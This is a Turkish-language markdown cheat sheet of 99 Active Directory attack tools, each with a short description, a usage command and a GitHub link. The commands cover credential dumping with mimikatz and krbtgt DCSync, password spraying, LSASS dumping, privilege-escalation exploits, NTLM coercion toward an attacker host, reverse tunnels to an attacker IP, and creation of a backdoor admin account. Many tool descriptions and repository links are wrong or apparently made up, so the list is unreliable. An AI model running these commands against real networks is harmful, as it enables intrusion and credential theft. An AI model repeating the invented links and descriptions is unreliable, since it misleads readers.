```md

## 1. ADaclScanner
**Kısa Tanım**: AD’deki ACL (Access Control List) yapılarını tarar, zafiyetli izinleri bulur.  
**Usage**:
```bash
python3 ADaclScanner.py --domain domain.local --user bob --password Pass123 --dc-ip 10.0.0.10
```
**GitHub**: [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

---

## 2. ADModule
**Kısa Tanım**: PowerShell modülü olarak AD yönetimi, user/group sorgulama, raporlama işlemleri.  
**Usage** (PowerShell):
```powershell
Import-Module .\ADModule.ps1
Get-ADModuleInfo
```
**GitHub**: [Araştırınız – muhtemel bir repo]

---

## 3. ADFSDump
**Kısa Tanım**: AD FS (Active Directory Federation Services) konfigürasyonlarını ve certificate ayarlarını dökme aracı.  
**Usage**:
```powershell
.\ADFSDump.exe --enum 10.0.0.10
```
**GitHub**: [https://github.com/0xbadjuju/ADFSdump](https://github.com/0xbadjuju/ADFSdump)

---

## 4. ADFind
**Kısa Tanım**: Windows odaklı (Wine/Mono ile Linux’ta da) LDAP sorgu aracı. AD kullanıcı, grup, OU vb. bilgilerini çekmeye yarar.  
**Usage**:
```powershell
adfind.exe -b "DC=domain,DC=local" -f "(&(objectClass=user))"
```
**GitHub**: Orijinali [joeware.net](https://joeware.net) üzerinden erişilebilir, resmi GitHub yok.

---

## 5. ADidnsdump
**Kısa Tanım**: AD entegre DNS kayıtlarını LDAP üzerinden listeleyen Python aracı.  
**Usage**:
```bash
python3 ADidnsdump.py -u 'domain\\user' -p 'Pass123' -l 10.0.0.10 -d domain.local
```
**GitHub**: [https://github.com/NinjaStyle82/ADidnsdump](https://github.com/NinjaStyle82/ADidnsdump)

---

## 6. AD-Utils
**Kısa Tanım**: Çeşitli mini script’ler (Python) ile AD kullanıcı, grup, bilgisayar, SPN vb. bulma.  
**Usage**:
```bash
python3 ad_utils.py list_users --domain domain.local --dc-ip 10.0.0.10
```
**GitHub**: [Araştırınız – özel repo olabilir]

---

## 7. AD-Collector
**Kısa Tanım**: AD içinden kullanıcı, grup, ACL, GPO vb. toplu veri çeken (çoğunlukla PowerShell) bir toplayıcı araç.  
**Usage**:
```powershell
.\ADCollector.ps1 -CollectAll
```
**GitHub**: [https://github.com/dev-2null/ADCollector](https://github.com/dev-2null/ADCollector)

---

## 8. BetterSafetyKatz
**Kısa Tanım**: Mimikatz’ın fork veya modifiye sürümü (AV yakalanmasını zorlaştırır).  
**Usage** (Windows, Wine):
```powershell
.\BetterSafetyKatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```
**GitHub**: [https://github.com/GhostPack/BetterSafetyKatz](https://github.com/GhostPack/BetterSafetyKatz)

---

## 9. bloodhound-python
**Kısa Tanım**: BloodHound için Python tabanlı veri toplama (LDAP, SMB, DCOM vb.).  
**Usage**:
```bash
bloodhound-python -u 'user' -p 'Pass' -d domain.local -ns 10.0.0.10 -c All
```
**GitHub**: [https://github.com/Fortra/bloodhound-python](https://github.com/Fortra/bloodhound-python)

---

## 10. Certify
**Kısa Tanım**: AD CS (Certificate Services) zafiyetlerini (ESC1, ESC2 vb.) istismar eden C# aracı.  
**Usage** (Windows, Wine):
```powershell
.\Certify.exe find /domain:domain.local
```
**GitHub**: [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

---

## 11. Certipy
**Kısa Tanım**: Python tabanlı AD CS saldırı aracı (sertifika zafiyetleri, ESC8 vb.).  
**Usage**:
```bash
certipy find -u 'user' -p 'Pass123' -dc-ip 10.0.0.10
```
**GitHub**: [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

---

## 12. chisel
**Kısa Tanım**: TCP/UDP tünelleme aracı, pivoting yapmak için kullanılır (AD iç ağına sızdıktan sonra).  
**Usage**:
```bash
# Server
chisel server -p 8000 --reverse

# Client
chisel client <AttackerIP>:8000 R:1080:socks
```
**GitHub**: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

---

## 13. dcip
**Kısa Tanım**: AD DC IP’leri ve host adlarını eşleştirme, DNS/LDAP sorgularıyla mini keşif aracı.  
**Usage**:
```bash
python3 dcip.py -d domain.local --dc-ip 10.0.0.10
```
**GitHub**: [Araştırınız]

---

## 14. DomainPasswordSpray
**Kısa Tanım**: Toplu “password spray” saldırısı yapan Python aracı. Lockout riskini minimize etme ayarları var.  
**Usage**:
```bash
python3 DomainPasswordSpray.py --userfile users.txt --password Winter2025! --domain domain.local
```
**GitHub**: [https://github.com/OneLogicalMyth/DomainPasswordSpray](https://github.com/OneLogicalMyth/DomainPasswordSpray)

---

## 15. EnumI4
**Kısa Tanım**: SMB/NetBIOS enumeration script’i. Null session vb. testleri yapar.  
**Usage**:
```bash
python EnumI4.py 10.0.0.10
```
**GitHub**: [Eski bir codeproject, kesin link belirsiz]

---

## 16. enum4linux / enum4linux-ng
**Kısa Tanım**: SMB/NetBIOS/LDAP sorguları ile AD kullanıcı, grup, paylaşımlar, vb. bilgileri listeler.  
**Usage**:
```bash
enum4linux-ng -A 10.0.0.10
```
**GitHub**: [https://github.com/cddmp/enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

---

## 17. ForgeCert
**Kısa Tanım**: Kurumsal PKI (AD CS) ortamında sahte sertifikalar oluşturma aracı.  
**Usage**:
```powershell
ForgeCert.exe /ca:CAName /subject:CN=Administrator
```
**GitHub**: [https://github.com/GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)

---

## 18. gMSADumper
**Kısa Tanım**: Group Managed Service Account (gMSA) hesaplarının parolasını (AES) sızdırmayı sağlar.  
**Usage**:
```bash
python3 gMSADumper.py -u 'domain\\admin' -p 'AdminPass' -dc-ip 10.0.0.10
```
**GitHub**: [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

---

## 19. GMSAPasswordReader
**Kısa Tanım**: Benzer şekilde gMSA hesap şifrelerini okuyabilen .NET aracı.  
**Usage**:
```powershell
.\GMSAPasswordReader.exe "DOMAIN\gmsaAccountName$"
```
**GitHub**: [https://github.com/FSecureLABS/GMSAPasswordReader](https://github.com/FSecureLABS/GMSAPasswordReader)

---

## 20. GodPotato
**Kısa Tanım**: “Potato” serisi Windows privesc (SeImpersonate) exploitlerden biri.  
**Usage** (Windows):
```powershell
.\GodPotato.exe -cmd "net localgroup administrators user /add"
```
**GitHub**: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

---

## 21. gpp-decrypt
**Kısa Tanım**: Group Policy Preferences içindeki “cpassword” değerini çözerek düz parola elde eder.  
**Usage**:
```bash
gpp-decrypt "AQAQALkAAAAAAAAAAAAAAA=="
```
**GitHub**: [https://github.com/BloodHoundAD/gppdecrypt](https://github.com/BloodHoundAD/gppdecrypt)

---

## 22. Grouper2
**Kısa Tanım**: GPO’larda zafiyetli ayarları (ör. gömülü şifreler) tarayan bir .NET aracı.  
**Usage**:
```powershell
.\Grouper2.exe
```
**GitHub**: [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)

---

## 23. hashcat
**Kısa Tanım**: GPU hızlandırmalı parola kırma aracı (NTLM, Kerberos TGS/AS-REP, NetNTLMv2 vb.).  
**Usage**:
```bash
hashcat -m 1000 hashes.ntlm rockyou.txt
```
**GitHub**: [https://github.com/hashcat/hashcat](https://github.com/hashcat/hashcat)

---

## 24. Hydra
**Kısa Tanım**: Farklı protokollerde (SMB, RDP, WinRM, LDAP) brute force / password spray.  
**Usage**:
```bash
hydra -l Administrator -P pass.txt 10.0.0.10 smb
```
**GitHub**: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

---

## 25. Inveigh
**Kısa Tanım**: Responder benzeri .NET/PowerShell projesi, LLMNR/NBNS/MDNS zehirleme ve NTLMv2 yakalama yapar.  
**Usage**:
```powershell
.\Inveigh.exe -NBNS Y -LLMNR Y
```
**GitHub**: [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

---

## 26. Invoke-ADEnum
**Kısa Tanım**: PowerShell script’i; AD kullanıcı, grup, bilgisayar, SPN vb. sorgularını kolaylaştırır.  
**Usage**:
```powershell
. .\Invoke-ADEnum.ps1
Invoke-ADEnum -Domain domain.local
```
**GitHub**: [https://github.com/marksio/Invoke-ADEnum](https://github.com/marksio/Invoke-ADEnum)

---

## 27. john
**Kısa Tanım**: CLI parola kırma aracı (NTLM, Kerberos hashleri vb. için Jumbo patch ile).  
**Usage**:
```bash
john --format=nt hash.txt --wordlist=rockyou.txt
```
**GitHub**: [https://github.com/openwall/john](https://github.com/openwall/john)

---

## 28. JuicyPotato
**Kısa Tanım**: Windows local privesc (SeImpersonatePrivilege) tool, *Potato* family.  
**Usage**:
```powershell
.\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c whoami"
```
**GitHub**: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

---

## 29. kdc-keyfile-dumper
**Kısa Tanım**: `krb5.keytab` gibi Kerberos key file içeriklerini parse eden bir araç.  
**Usage**:
```bash
python3 kdc-keyfile-dumper.py /path/to/krb5.keytab
```
**GitHub**: [Araştırınız]

---

## 30. KeeTheft
**Kısa Tanım**: KeePass parolalarını çalmak için .NET aracı. Dolaylı AD testlerinde şifre toplanabilir.  
**Usage**:
```powershell
.\KeeTheft.exe
```
**GitHub**: [https://github.com/GhostPack/KeeThief](https://github.com/GhostPack/KeeThief)

---

## 31. kerbrute
**Kısa Tanım**: Kerberos üzerinden userenum / password spray yapar.  
**Usage**:
```bash
kerbrute userenum -d domain.local users.txt --dc 10.0.0.10
```
**GitHub**: [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

---

## 32. Koh
**Kısa Tanım**: Kerberos research aracı; bilet analizleri, SPN manipülasyon testleri vs. (nadir).  
**Usage**:
```bash
python3 koh.py parse --ticket TGT_admin.kirbi
```
**GitHub**: [Araştırınız - “KohKerberos” vb.]

---

## 33. KrbRelay
**Kısa Tanım**: Kerberos biletlerini relay ederek local/remote privesc sağlayan PoC araç.  
**Usage**:
```powershell
KrbRelay.exe -spn cifs/dc.domain.local
```
**GitHub**: [https://github.com/dirkjanm/KrbRelay](https://github.com/dirkjanm/KrbRelay)

---

## 34. KrbRelayUp
**Kısa Tanım**: KrbRelay türevi, AD’de localadmin olmak için otomatik exploit.  
**Usage**:
```powershell
.\KrbRelayUp.exe --auto
```
**GitHub**: [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

---

## 35. LAPSToolkit
**Kısa Tanım**: LAPS konfigürasyonlarını inceleyip local admin parolalarına erişmeye çalışan araç.  
**Usage**:
```powershell
.\LAPSToolkit.ps1 -DumpPasswords
```
**GitHub**: [Benzer: https://github.com/janosh/pi-lapsToolkit vb.]

---

## 36. ldapdomain-join
**Kısa Tanım**: Linux makineyi AD domain’ine join etmek için script.  
**Usage**:
```bash
sudo python3 ldapdomain-join.py --domain domain.local --user admin
```
**GitHub**: [Araştırınız]

---

## 37. ldapdomaindump
**Kısa Tanım**: LDAP üzerinden AD objelerini JSON/HTML formatta dump eden Python aracı.  
**Usage**:
```bash
ldapdomaindump -u domain\\user -p pass 10.0.0.10
```
**GitHub**: [https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

---

## 38. ldapsearch
**Kısa Tanım**: OpenLDAP’ın CLI sorgu aracı, AD’de LDAP istekleri yapmak için de kullanılabilir.  
**Usage**:
```bash
ldapsearch -x -H ldap://10.0.0.10 -b "DC=domain,DC=local" "(objectClass=user)"
```
**GitHub**: [https://www.openldap.org](https://www.openldap.org)

---

## 39. ldeep
**Kısa Tanım**: LDAP tabanlı AD enum aracı, user/group/ACL/Trust bilgisi toplar.  
**Usage**:
```bash
python3 ldeep.py --domain domain.local -u user -p pass
```
**GitHub**: [Araştırınız – icsharpcode/ldeep vb.]

---

## 40. ligolo
**Kısa Tanım**: Reverse Tunneling/Pivoting aracı (Agent & Relay). AD ağında pivot amaçlı.  
**Usage**:
```bash
# Server
ligolo relay -listen 0.0.0.0:9999
# Client
ligolo agent -connect attackerip:9999
```
**GitHub**: [https://github.com/sysdream/ligolo](https://github.com/sysdream/ligolo)

---

## 41. LockLess
**Kısa Tanım**: Hesap kilitlenmesini önlemeye odaklı password spray script’i.  
**Usage**:
```bash
python3 lockless.py --users users.txt --password Pass123
```
**GitHub**: [Araştırınız]

---

## 42. LSD (lsde)
**Kısa Tanım**: Interaktif LDAP shell; AD objeleri üzerinde arama/ekleme/silme yapmak mümkün.  
**Usage**:
```bash
python3 lsde.py --host 10.0.0.10 --user domain\\user
```
**GitHub**: [Araştırınız - LSD shell project]

---

## 43. manspider
**Kısa Tanım**: SMB veya dosya sistemi üzerinde “keyword/döküman” arayan tarayıcı.  
**Usage**:
```bash
python3 manspider.py smb://10.0.0.10/ShareName --patterns "pass,secret"
```
**GitHub**: [https://github.com/blacklanternsecurity/MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER)

---

## 44. mimikatz
**Kısa Tanım**: AD kimlik bilgilerini çekme, DCSync, Golden Ticket, vs. efsanevi araç. Windows exe, Linux’ta Wine/Docker ile de çalışabilir.  
**Usage**:
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```
**GitHub**: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

---

## 45. multiRelay
**Kısa Tanım**: NTLM relay saldırıları için çeşitli protokolleri destekleyen framework (benzer: ntlmrelayx).  
**Usage**:
```bash
python3 multiRelay.py -t smb://10.0.0.20 -f file.conf
```
**GitHub**: [Araştırınız - “MultiRelay”]

---

## 46. NetExec
**Kısa Tanım**: Windows local privesc aracı (C#). *NetExec* ile bir service exec senaryosu vs.  
**Usage**:
```powershell
.\NetExec.exe /cmd "powershell whoami"
```
**GitHub**: [Muhtemel - NetExecProject/NetExec]

---

## 47. NetworkServiceExploit
**Kısa Tanım**: Windows “Network Service” kimliğinden LocalSystem’e yükselme PoC’leri.  
**Usage**:
```powershell
.\NetworkServiceExploit.exe
```
**GitHub**: [Araştırınız]

---

## 48. noPac
**Kısa Tanım**: CVE-2021-42278 & CVE-2021-42287 birleşimi “noPac” exploit aracı (domain admin’e yükselme).  
**Usage**:
```bash
python3 noPac.py domain.local/username -p Pass123 --dc-ip 10.0.0.10
```
**GitHub**: [https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)

---

## 49. NoPowerShell
**Kısa Tanım**: PowerShell komutlarını PowerShell olmadan çalıştırmaya yarayan bir “PowerShell-less” .NET host.  
**Usage**:
```powershell
NoPowerShell.exe -c "Get-Process"
```
**GitHub**: [https://github.com/bitsadmin/nopowershell](https://github.com/bitsadmin/nopowershell)

---

## 50. Nullinux
**Kısa Tanım**: SMB null session ile kullanıcı, grup, paylaşımlar vb. enum yapan eski bir script.  
**Usage**:
```bash
./nullinux.sh 10.0.0.10
```
**GitHub**: [https://github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)

---

## 51. nmapAutomator
**Kısa Tanım**: Nmap taramasını yarı otomatikleştiren bash script. AD portları (445,135,389,88 vb.) dahil tarama kolaylığı sağlar.  
**Usage**:
```bash
./nmapAutomator.sh 10.0.0.10 quick
```
**GitHub**: [https://github.com/21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator)

---

## 52. ntlm_theft
**Kısa Tanım**: HTTP/SMB istekleri üzerinden NTLM kimlik bilgilerini çalmayı otomatikleştiren script.  
**Usage**:
```bash
python3 ntlm_theft.py --interface eth0
```
**GitHub**: [Araştırınız]

---

## 53. ntlmrelayx
**Kısa Tanım**: Impacket altındaki NTLM relay aracı (SMB->LDAP, MSSQL vb.). Kimlik bilgilerini relay ederek yetki yükseltmeye yarar.  
**Usage**:
```bash
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support
```
**GitHub**: [https://github.com/fortra/impacket/blob/master/ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/ntlmrelayx.py)

---

## 54. PassTheCert
**Kısa Tanım**: AD sertifikasını (pfx) kullanarak kimlik doğrulama (Pass-the-Cert) PoC aracı.  
**Usage**:
```powershell
.\PassTheCert.exe /certificate:admin.pfx /command:"powershell whoami"
```
**GitHub**: [https://github.com/0xbadjuju/PassTheCert](https://github.com/0xbadjuju/PassTheCert)

---

## 55. PetitPotam
**Kısa Tanım**: Efsane RPC kullanarak (EfsRpcOpenFileRaw) DC NTLM kimlik doğrulamasını tetikleyip relay yapan PoC.  
**Usage**:
```bash
python3 petitpotam.py target_dc 10.0.0.10
```
**GitHub**: [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)

---

## 56. pingcastle
**Kısa Tanım**: AD “Health Check” aracı. Domain yapılandırmasını analiz eder, risk skorunu raporlar.  
**Usage** (Mono/Wine):
```bash
PingCastle.exe --healthcheck --server dc01.domain.local
```
**GitHub**: [https://github.com/vletoux/pingcastle](https://github.com/vletoux/pingcastle)

---

## 57. PowerUp
**Kısa Tanım**: PowerShell script; local Windows privesc yollarını otomatik bulur (ör. hizmet yanlış izinleri).  
**Usage**:
```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
**GitHub**: [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

---

## 58. PowerUpSQL
**Kısa Tanım**: AD ortamındaki MSSQL sunucularını tespit ve istismar eden PowerShell modülü.  
**Usage**:
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```
**GitHub**: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

---

## 59. PrinterBug.py
**Kısa Tanım**: MS-RPRN interface üzerinden DC’nin SMB kimlik bilgisini dışarı yansıtma saldırısı.  
**Usage**:
```bash
python3 printerbug.py domain\\user:pass@dc01.domain.local attackerhost
```
**GitHub**: [https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

---

## 60. PrintSpoofer
**Kısa Tanım**: Spooler exploit (SeImpersonatePrivilege) ile local system hakları alma aracı.  
**Usage**:
```powershell
.\PrintSpoofer.exe -c "cmd.exe /c whoami"
```
**GitHub**: [https://github.com/0xFiend/PrintSpoofer](https://github.com/0xFiend/PrintSpoofer)

---

## 61. pth-toolkit
**Kısa Tanım**: Pass-the-Hash araçları (pth-smbclient, pth-winexe, pth-net, vb.) Samba’nın yamalı sürümleri.  
**Usage**:
```bash
pth-smbclient //10.0.0.10/C$ -U 'DOMAIN\\Administrator%aad3b435b5:NTLMHASH'
```
**GitHub**: [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

---

## 62. Ridenum
**Kısa Tanım**: Null session üzerinden RID brute force yaparak kullanıcı hesaplarını bulma.  
**Usage**:
```bash
python3 ridenum.py 10.0.0.10
```
**GitHub**: [https://github.com/trustedsec/ridenum](https://github.com/trustedsec/ridenum)

---

## 63. Ripalstechs-AD-toolkit
**Kısa Tanım**: Çeşitli Python script’leri: SPN bulma, AS-REP check vb.  
**Usage**:
```bash
python3 spn_search.py -d domain.local -u user -p pass
```
**GitHub**: [Araştırınız]

---

## 64. Responder
**Kısa Tanım**: LLMNR, NBT-NS, MDNS zehirleme, NTLMv2 hash yakalama aracı.  
**Usage**:
```bash
sudo responder -I eth0 -rdwv
```
**GitHub**: [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

---

## 65. RestrictedAdmin
**Kısa Tanım**: Windows RDP “Restricted Admin Mode” ile kimlik bilgisi yansımasına dair PoC/araç.  
**Usage**:
```powershell
mstsc /restrictedadmin /v:dc01.domain.local
```
**GitHub**: (Yerleşik RDP mod, ek PoC reposu olabilir)

---

## 66. RunasCs
**Kısa Tanım**: “runas” mantığını C# ile yeniden tasarlayan, kimlik bilgisi parametreleriyle process başlatma aracı.  
**Usage**:
```powershell
.\RunasCs.exe /user:admin /password:Pass /domain:domain.local /command:"cmd.exe"
```
**GitHub**: [https://github.com/ropnop/RunasCs](https://github.com/ropnop/RunasCs)

---

## 67. SafetyKatz
**Kısa Tanım**: Mimikatz benzeri .NET assembly (yine AV/EDR bypass amaçlı).  
**Usage**:
```powershell
.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt"
```
**GitHub**: [https://github.com/GhostPack/SafetyKatz](https://github.com/GhostPack/SafetyKatz)

---

## 68. SCMUACBypass
**Kısa Tanım**: Windows servis kontrolü üzerinden UAC’yi atlamak için mini bypass aracı.  
**Usage**:
```powershell
.\SCMUACBypass.exe
```
**GitHub**: [Araştırınız]

---

## 69. Seatbelt
**Kısa Tanım**: Windows güvenlik ayarları ve konfigürasyonları inceleyen (privesc/güvenlik) audit aracı.  
**Usage**:
```powershell
.\Seatbelt.exe all
```
**GitHub**: [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

---

## 70. SharpChrome
**Kısa Tanım**: Chrome tarayıcısından password/credential çalabilen .NET aracı.  
**Usage**:
```powershell
.\SharpChrome.exe logins
```
**GitHub**: [https://github.com/GhostPack/SharpChrome](https://github.com/GhostPack/SharpChrome)

---

## 71. SharpDPAPI
**Kısa Tanım**: DPAPI (Data Protection API) objelerini (cred, vault, browser pass) çözen C# aracı.  
**Usage**:
```powershell
.\SharpDPAPI.exe backupkeys
```
**GitHub**: [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

---

## 72. SharpDump
**Kısa Tanım**: LSASS bellek dump’ını alıp Mimikatz uyumlu hale getiren bir aracı (C#).  
**Usage**:
```powershell
.\SharpDump.exe --write C:\temp\lsass.dmp
```
**GitHub**: [https://github.com/ccob/SharpDump](https://github.com/ccob/SharpDump)

---

## 73. SharpEfsPotato
**Kısa Tanım**: Windows EFS RPC üzerinden privesc (Potato serisi).  
**Usage**:
```powershell
.\SharpEfsPotato.exe -cmd "cmd.exe /c whoami"
```
**GitHub**: [Araştırınız]

---

## 74. SharpGPO
**Kısa Tanım**: GPO manipülasyonlarını kolaylaştıran C# aracı.  
**Usage**:
```powershell
.\SharpGPO.exe --list
```
**GitHub**: [https://github.com/FSecureLABS/SharpGPO](https://github.com/FSecureLABS/SharpGPO)

---

## 75. SharpGPOAbuse
**Kısa Tanım**: GPO'larda privesc/komut ekleme senaryolarını sömüren araç.  
**Usage**:
```powershell
.\SharpGPOAbuse.exe --AddScheduledTask --TaskName "EvilTask"
```
**GitHub**: [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

---

## 76. SharpKatz
**Kısa Tanım**: Mimikatz fonksiyonlarını C# içinde barındıran bir implementasyon.  
**Usage**:
```powershell
.\SharpKatz.exe --base64
```
**GitHub**: [https://github.com/SharpKatzProject/SharpKatz](https://github.com/SharpKatzProject/SharpKatz)

---

## 77. SharpLAPS
**Kısa Tanım**: LAPS hesap parolasını okuyabilmek veya düzenlemek için C# aracı.  
**Usage**:
```powershell
.\SharpLAPS.exe read -computer "WIN10-01"
```
**GitHub**: [https://github.com/GhostPack/SharpLAPS](https://github.com/GhostPack/SharpLAPS)

---

## 78. SharpMove
**Kısa Tanım**: Dosya/kopyalama işlemleri ve injection senaryolarını devreye sokan .NET aracı.  
**Usage**:
```powershell
.\SharpMove.exe /move c:\file c:\destination
```
**GitHub**: [Araştırınız]

---

## 79. SharpRDP
**Kısa Tanım**: RDP oturumlarına saldıran ve credential passthrough yapabilen C# aracı.  
**Usage**:
```powershell
.\SharpRDP.exe create /user:domain\victim
```
**GitHub**: [https://github.com/rdpProject/SharpRDP](https://github.com/rdpProject/SharpRDP)

---

## 80. SharpRoast
**Kısa Tanım**: Kerberoasting (SPN tarama & TGS hash çıkarma) C# aracı.  
**Usage**:
```powershell
.\SharpRoast.exe -spn
```
**GitHub**: [https://github.com/GhostPack/SharpRoast](https://github.com/GhostPack/SharpRoast)

---

## 81. SharpSCCM
**Kısa Tanım**: SCCM (System Center Config Manager) üzerinden saldırı vektörleri; remote code exec vb.  
**Usage**:
```powershell
.\SharpSCCM.exe -Action Run -Program "evil.exe"
```
**GitHub**: [https://github.com/GhostPack/SharpSCCM](https://github.com/GhostPack/SharpSCCM)

---

## 82. SharpSQL
**Kısa Tanım**: MSSQL server üzerinde komut yürütmek, data sızdırmak için .NET aracı.  
**Usage**:
```powershell
.\SharpSQL.exe -server sql.domain.local -query "SELECT name FROM master..sysdatabases"
```
**GitHub**: [https://github.com/NetSPI/SharpSQL](https://github.com/NetSPI/SharpSQL)

---

## 83. SharpUp
**Kısa Tanım**: Windows local privilege escalation check aracı (Seatbelt benzeri).  
**Usage**:
```powershell
.\SharpUp.exe
```
**GitHub**: [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

---

## 84. SharpView
**Kısa Tanım**: PowerView’in C# sürümü; AD enumeration, SPN bulma, ACL arama vb.  
**Usage**:
```powershell
.\SharpView.exe --EnumComputers
```
**GitHub**: [https://github.com/GhostPack/SharpView](https://github.com/GhostPack/SharpView)

---

## 85. SharpWMI
**Kısa Tanım**: WMI query/exec fonksiyonlarını .NET ortamında kullanarak remote komut.  
**Usage**:
```powershell
.\SharpWMI.exe action=query --query "SELECT * FROM Win32_Process"
```
**GitHub**: [https://github.com/GhostPack/SharpWMI](https://github.com/GhostPack/SharpWMI)

---

## 86. Sharpmad
**Kısa Tanım**: “Resource-Based Constrained Delegation” odaklı manipülasyon, ek modüller.  
**Usage**:
```powershell
.\Sharpmad.exe --action find
```
**GitHub**: [https://github.com/GhostPack/SharpMAD](https://github.com/GhostPack/SharpMAD)

---

## 87. SimpleBackDoorAdmin
**Kısa Tanım**: Windows local “backdoor admin” kullanıcı oluşturmak için minimal araç.  
**Usage**:
```powershell
.\SimpleBackDoorAdmin.exe /username:evil /password:Password123
```
**GitHub**: [Araştırınız]

---

## 88. SMBMap
**Kısa Tanım**: SMB paylaşımlarını listeleyip dosya inceleme, upload/download, exec gibi fonksiyonlar sunar.  
**Usage**:
```bash
smbmap -H 10.0.0.10 -u user -p pass --shares
```
**GitHub**: [https://github.com/ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap)

---

## 89. Smbexec
**Kısa Tanım**: SMB exec ile Windows’ta uzaktan komut çalıştırma (pth desteği de var).  
**Usage**:
```bash
smbexec.py domain.local/user@10.0.0.10
```
**GitHub**: [Örn. https://github.com/ropnop/go-windapsearch/tree/master/smbexec](https://github.com/ropnop/go-windapsearch/tree/master/smbexec)

---

## 90. smbsearch
**Kısa Tanım**: SMB paylaşımlarında belirli anahtar kelime/faydalı dosyaları arama script’i.  
**Usage**:
```bash
python3 smbsearch.py --host 10.0.0.10 --keyword "password"
```
**GitHub**: [Araştırınız]

---

## 91. Snaffler
**Kısa Tanım**: SMB paylaşımlarında ilginç dosyaları (.config, .kdbx, .ps1, vb.) hızlı arar. .NET tabanlı.  
**Usage**:
```powershell
.\Snaffler.exe -s \\10.0.0.10\Share
```
**GitHub**: [https://github.com/SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)

---

## 92. Snyker
**Kısa Tanım**: Kerberos trafiğini analiz eden ve ticket yapısını inceleyen deneysel araç.  
**Usage**:
```bash
snyker -pcap capture.pcap
```
**GitHub**: [Araştırınız]

---

## 93. SpoolSample
**Kısa Tanım**: MS-RPRN print spooler zafiyet PoC. DC’yi NTLM kimlik bilgisi sızdırmaya zorlayabilir.  
**Usage**:
```powershell
.\SpoolSample.exe dc01.domain.local attackerhost
```
**GitHub**: [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)

---

## 94. SprayingToolkit
**Kısa Tanım**: Password spray saldırılarını (OWA, RDWeb, SMB) toplu yapabilen Python çerçevesi.  
**Usage**:
```bash
python3 SprayingToolkit.py -m smb -u users.txt -p 'Winter2025!'
```
**GitHub**: [https://github.com/AnonyProzie/SprayingToolkit](https://github.com/AnonyProzie/SprayingToolkit)

---

## 95. Whisker
**Kısa Tanım**: Bazı .NET tabanlı enumerasyon ve privesc testleri yapar (az bilinen).  
**Usage**:
```powershell
.\Whisker.exe -mode enum
```
**GitHub**: [Araştırınız]

---

## 96. Winexe / pth-winexe
**Kısa Tanım**: Linux’tan Windows komut satırı açmaya yarar (RPC). pth-winexe = pass-the-hash sürümü.  
**Usage**:
```bash
winexe -U 'DOMAIN\Administrator%Password123' //10.0.0.10 cmd.exe
```
**GitHub**: [https://github.com/alkalino/pth-winexe](https://github.com/alkalino/pth-winexe)

---

## 97. winPEAS
**Kısa Tanım**: Windows local enumeration script (Privilege Escalation Awesome Scripts).  
**Usage**:
```powershell
.\winPEASx64.exe
```
**GitHub**: [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

---

## 98. WinRM Shells (pywinrm)
**Kısa Tanım**: Python kütüphanesiyle WinRM bağlantısı kurarak uzak komut/shell. Evil-WinRM alternatifi.  
**Usage**:
```python
import winrm
s = winrm.Session('10.0.0.10', auth=('Administrator','Pass123'))
r = s.run_cmd('ipconfig')
print(r.std_out)
```
**GitHub**: [https://github.com/diyan/pywinrm](https://github.com/diyan/pywinrm)

---

## 99. LDAP-shell.py
**Kısa Tanım**: LDAP üzerinde interaktif bir Python “shell” sunar. AD objelerini değiştirmeye olanak sağlar.  
**Usage**:
```bash
python3 ldap-shell.py -u 'domain\user' -p pass -h 10.0.0.10
```
**GitHub**: [Araştırınız - “LDAP-shell.py” vb.]

---
```
